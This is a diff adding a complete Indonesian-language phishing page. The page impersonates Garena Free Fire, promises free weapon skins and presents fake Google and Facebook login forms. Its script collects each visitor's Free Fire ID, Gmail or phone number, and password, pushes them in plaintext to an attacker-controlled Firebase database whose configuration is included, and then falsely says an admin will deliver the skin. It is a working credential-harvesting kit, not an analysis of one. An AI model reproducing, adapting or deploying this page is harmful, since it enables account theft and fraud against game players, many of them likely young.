@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Free Fire - Free Weapon Skins</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
+    <style>
+        :root {
+            --primary: #e60012;
+            --secondary: #000000;
+            --accent: #ffffff;
+            --dark-bg: #0a0a0a;
+            --card-bg: #151515;
+            --gradient: linear-gradient(135deg, #e60012 0%, #990000 100%);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            color: var(--accent);
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(230, 0, 18, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 85% 30%, rgba(230, 0, 18, 0.1) 0%, transparent 20%),
+                linear-gradient(to bottom, rgba(10, 10, 10, 0.9), rgba(10, 10, 10, 0.9));
+            background-attachment: fixed;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 30px 0;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: 800;
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 20px var(--primary);
+            position: relative;
+            display: inline-block;
+        }
+        
+        .logo::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: var(--gradient);
+            border-radius: 2px;
+        }
+        
+        .subtitle {
+            font-size: 18px;
+            color: #ccc;
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        .weapons-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 30px;
+            margin-bottom: 50px;
+        }
+        
+        .weapon-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .weapon-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4), 0 0 20px rgba(230, 0, 18, 0.3);
+        }
+        
+        .weapon-card.selected {
+            border: 2px solid var(--primary);
+            box-shadow: 0 0 30px rgba(230, 0, 18, 0.5);
+        }
+        
+        .weapon-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .weapon-name {
+            padding: 20px;
+            text-align: center;
+            font-weight: 600;
+            font-size: 18px;
+            background: rgba(0, 0, 0, 0.7);
+            color: var(--accent);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .weapon-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: var(--gradient);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        
+        .weapon-card:hover::before {
+            opacity: 1;
+        }
+        
+        .login-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(5px);
+        }
+        
+        .login-content {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 450px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(230, 0, 18, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+        }
+        
+        .login-header {
+            background: var(--gradient);
+            padding: 25px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            position: relative;
+        }
+        
+        .login-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+        }
+        
+        .login-body {
+            padding: 30px;
+        }
+        
+        .selected-weapon {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 20px;
+            color: var(--primary);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .login-form {
+            display: none;
+            flex-direction: column;
+            gap: 20px;
+        }
+        
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        .form-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #ccc;
+        }
+        
+        .form-input {
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--accent);
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 10px rgba(230, 0, 18, 0.3);
+        }
+        
+        .login-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 10px;
+        }
+        
+        .login-btn {
+            padding: 16px;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            transition: all 0.3s;
+        }
+        
+        .google-btn {
+            background: #fff;
+            color: #757575;
+            border: 1px solid #ddd;
+        }
+        
+        .google-btn:hover {
+            background: #f5f5f5;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .facebook-btn {
+            background: #3b5998;
+            color: #fff;
+        }
+        
+        .facebook-btn:hover {
+            background: #344e86;
+            transform: translateY(-2px);
+            box-shadow: 0 5月 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .submit-btn {
+            background: var(--gradient);
+            color: white;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(230, 0, 18, 0.4);
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(0, 0, 0, 0.5);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 10;
+            transition: all 0.3s;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .close-modal:hover {
+            background: var(--primary);
+            transform: rotate(90deg);
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px;
+            margin-top: 50px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #999;
+            font-size: 14px;
+        }
+        
+        .footer-logo {
+            color: var(--primary);
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .weapons-grid {
+                grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+                gap: 20px;
+            }
+            
+            .logo {
+                font-size: 32px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">Free Fire Skins</div>
+            <div class="subtitle">Dapatkan skin senjata eksklusif secara gratis! Pilih skin favorit Anda dan login untuk mengklaimnya.</div>
+        </header>
+        
+        <div class="weapons-grid">
+            <div class="weapon-card" data-weapon="MP40 UCHIHA LEGACY">
+                <img src="https://files.catbox.moe/bq6d82.jpeg" alt="MP40 UCHIHA LEGACY" class="weapon-image">
+                <div class="weapon-name">MP40 UCHIHA LEGACY</div>
+            </div>
+            
+            <div class="weapon-card" data-weapon="SG INCENDIUM BURST">
+                <img src="https://files.catbox.moe/dgo44b.jpeg" alt="SG INCENDIUM BURST" class="weapon-image">
+                <div class="weapon-name">SG INCENDIUM BURST</div>
+            </div>
+            
+            <div class="weapon-card" data-weapon="MP40 COBRA">
+                <img src="https://files.catbox.moe/km5il3.jpeg" alt="MP40 COBRA" class="weapon-image">
+                <div class="weapon-name">MP40 COBRA</div>
+            </div>
+            
+            <div class="weapon-card" data-weapon="AK47 FLAME-DRAGON">
+                <img src="https://files.catbox.moe/xdgt3f.jpeg" alt="AK47 FLAME-DRAGON" class="weapon-image">
+                <div class="weapon-name">AK47 FLAME-DRAGON</div>
+            </div>
+            
+            <div class="weapon-card" data-weapon="PARAFAL LORE CYCLONE">
+                <img src="https://files.catbox.moe/61rroq.jpeg" alt="PARAFAL LORE CYCLONE" class="weapon-image">
+                <div class="weapon-name">PARAFAL LORE CYCLONE</div>
+            </div>
+        </div>
+        
+        <div class="login-modal" id="loginModal">
+            <div class="close-modal" id="closeModal">×</div>
+            <div class="login-content">
+                <div class="login-header">Login untuk Klaim Skin</div>
+                <div class="login-body">
+                    <div class="selected-weapon" id="selectedWeaponName">MP40 UCHIHA LEGACY</div>
+                    
+                    <div class="login-options">
+                        <button class="login-btn google-btn" id="googleLogin">
+                            <i class="fab fa-google"></i>
+                            <span>Login dengan Google</span>
+                        </button>
+                        <button class="login-btn facebook-btn" id="facebookLogin">
+                            <i class="fab fa-facebook-f"></i>
+                            <span>Login dengan Facebook</span>
+                        </button>
+                    </div>
+                    
+                    <form class="login-form" id="googleForm">
+                        <div class="form-group">
+                            <label class="form-label">ID Free Fire</label>
+                            <input type="text" class="form-input" placeholder="Masukkan ID Free Fire" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Gmail</label>
+                            <input type="email" class="form-input" placeholder="Masukkan Gmail" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Password</label>
+                            <input type="password" class="form-input" placeholder="Masukkan Password" required>
+                        </div>
+                        <button type="button" class="login-btn submit-btn" id="submitGoogle">
+                            <i class="fas fa-check"></i>
+                            <span>Klaim Skin</span>
+                        </button>
+                    </form>
+                    
+                    <form class="login-form" id="facebookForm">
+                        <div class="form-group">
+                            <label class="form-label">ID Free Fire</label>
+                            <input type="text" class="form-input" placeholder="Masukkan ID Free Fire" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Nomor HP</label>
+                            <input type="tel" class="form-input" placeholder="Masukkan Nomor HP" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Password</label>
+                            <input type="password" class="form-input" placeholder="Masukkan Password" required>
+                        </div>
+                        <button type="button" class="login-btn submit-btn" id="submitFacebook">
+                            <i class="fas fa-check"></i>
+                            <span>Klaim Skin</span>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <div class="footer-logo">GARENA FREE FIRE</div>
+            <p>© 2023 Garena Free Fire. All rights reserved.</p>
+        </footer>
+    </div>
+
+    <script>
+        // Inisialisasi Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyA_QzbdScTX2dLdu_VchsPH1JL-1tn3RcI",
+            authDomain: "chat-message-fcf6f.firebaseapp.com",
+            databaseURL: "https://chat-message-fcf6f-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "chat-message-fcf6f",
+            storageBucket: "chat-message-fcf6f.appspot.com",
+            messagingSenderId: "137162503818",
+            appId: "1:137162503818:web:2c782da021738705e99f73"
+        };
+        
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Elemen DOM
+        const weaponCards = document.querySelectorAll('.weapon-card');
+        const loginModal = document.getElementById('loginModal');
+        const closeModal = document.getElementById('closeModal');
+        const selectedWeaponName = document.getElementById('selectedWeaponName');
+        const googleLoginBtn = document.getElementById('googleLogin');
+        const facebookLoginBtn = document.getElementById('facebookLogin');
+        const googleForm = document.getElementById('googleForm');
+        const facebookForm = document.getElementById('facebookForm');
+        const submitGoogleBtn = document.getElementById('submitGoogle');
+        const submitFacebookBtn = document.getElementById('submitFacebook');
+        
+        let selectedWeapon = '';
+        let loginMethod = '';
+        
+        // Event listener untuk memilih senjata
+        weaponCards.forEach(card => {
+            card.addEventListener('click', () => {
+                weaponCards.forEach(c => c.classList.remove('selected'));
+                card.classList.add('selected');
+                selectedWeapon = card.getAttribute('data-weapon');
+                selectedWeaponName.textContent = selectedWeapon;
+                loginModal.style.display = 'flex';
+                
+                // Sembunyikan form login saat pertama kali modal muncul
+                googleForm.style.display = 'none';
+                facebookForm.style.display = 'none';
+                document.querySelector('.login-options').style.display = 'flex';
+            });
+        });
+        
+        // Event listener untuk menutup modal
+        closeModal.addEventListener('click', () => {
+            loginModal.style.display = 'none';
+        });
+        
+        // Event listener untuk login Google
+        googleLoginBtn.addEventListener('click', () => {
+            loginMethod = 'Google';
+            document.querySelector('.login-options').style.display = 'none';
+            googleForm.style.display = 'flex';
+        });
+        
+        // Event listener untuk login Facebook
+        facebookLoginBtn.addEventListener('click', () => {
+            loginMethod = 'Facebook';
+            document.querySelector('.login-options').style.display = 'none';
+            facebookForm.style.display = 'flex';
+        });
+        
+        // Event listener untuk submit Google
+        submitGoogleBtn.addEventListener('click', () => {
+            const ffId = document.querySelector('#googleForm .form-input[type="text"]').value;
+            const gmail = document.querySelector('#googleForm .form-input[type="email"]').value;
+            const password = document.querySelector('#googleForm .form-input[type="password"]').value;
+            
+            if (ffId && gmail && password) {
+                sendLoginData('Google', selectedWeapon, ffId, gmail, password, '');
+            } else {
+                alert('Harap isi semua field dengan benar!');
+            }
+        });
+        
+        // Event listener untuk submit Facebook
+        submitFacebookBtn.addEventListener('click', () => {
+            const ffId = document.querySelector('#facebookForm .form-input[type="text"]').value;
+            const phone = document.querySelector('#facebookForm .form-input[type="tel"]').value;
+            const password = document.querySelector('#facebookForm .form-input[type="password"]').value;
+            
+            if (ffId && phone && password) {
+                sendLoginData('Facebook', selectedWeapon, ffId, '', password, phone);
+            } else {
+                alert('Harap isi semua field dengan benar!');
+            }
+        });
+        
+        // Fungsi untuk mengirim data login ke Firebase
+        function sendLoginData(loginMethod, weapon, ffId, gmail, password, phone) {
+            const timestamp = new Date().toISOString();
+            const userData = {
+                loginMethod: loginMethod,
+                weapon: weapon,
+                ffId: ffId,
+                gmail: gmail,
+                password: password,
+                phone: phone,
+                timestamp: timestamp,
+                status: 'pending'
+            };
+            
+            // Simpan data ke Firebase
+            const newDataRef = database.ref('loginData').push();
+            newDataRef.set(userData)
+                .then(() => {
+                    alert('Login berhasil! Data telah dikirim. Admin akan memverifikasi dan mengirimkan skin Anda.');
+                    loginModal.style.display = 'none';
+                    
+                    // Reset form
+                    document.querySelectorAll('.form-input').forEach(input => {
+                        input.value = '';
+                    });
+                })
+                .catch((error) => {
+                    alert('Terjadi kesalahan: ' + error.message);
+                });
+        }
+    </script>
+</body>
+</html>
